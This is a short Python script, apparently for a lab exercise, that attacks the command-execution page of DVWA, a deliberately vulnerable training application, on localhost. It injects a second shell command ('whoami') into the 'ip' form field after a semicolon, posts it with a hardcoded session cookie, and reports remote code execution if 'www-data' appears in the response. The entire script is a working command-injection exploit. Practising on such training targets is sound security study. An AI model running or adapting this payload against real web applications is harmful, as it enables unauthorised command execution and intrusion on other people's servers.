import requests

# Set the DVWA URL and command to test for RCE
dvwa_url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"
command_to_inject = "whoami"  # Common Linux command to test for RCE

# Setup the payload that will be sent in the request
payload = {
    'ip': f'127.0.0.1; {command_to_inject} #',
    'Submit': 'Submit'
}

# Set up the session and include any necessary cookies, such as for authentication
session = requests.Session()

# Replace with your DVWA security level cookie, PHPSESSID, and security token if needed
cookies = {
    'PHPSESSID': '1df0jmsijuc4ufvdbeu381lnsh',
    'security': 'low'  # Ensure DVWA security level is set to low for testing
}

# Send the payload to the DVWA command injection page
response = session.post(dvwa_url, data=payload, cookies=cookies)

# Print status code and full response text for debugging
print("Status Code:", response.status_code)
print("Response Text:", response.text)

# Check if the response contains the result of the injected command
if "www-data" in response.text:
    print("[+] RCE Detected! Command injection successful.")
    print("Command output:")
    print(response.text)
else:
    print("[-] RCE not detected.")

